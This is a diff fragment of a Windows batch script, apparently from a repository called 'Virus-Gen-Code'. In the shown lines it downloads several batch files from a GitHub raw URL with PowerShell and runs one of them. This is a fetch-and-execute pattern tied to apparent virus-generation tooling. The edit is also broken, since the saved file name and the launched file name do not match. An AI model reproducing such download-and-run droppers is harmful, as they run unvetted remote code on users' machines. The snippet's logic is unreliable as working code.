@@ -82,8 +82,8 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   set /p opt2=directory:
 :: create all files needed
   :: create placeholder file
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar.bat").Content >"progress bar.bat"
-    start call "progress bar.bat"
+    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar2.bat").Content >"progress bar.bat"
+    start call "progress bar2.bat"
     timeout 1 >nul
     echo 1>load_trigger.txt
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >temp.txt
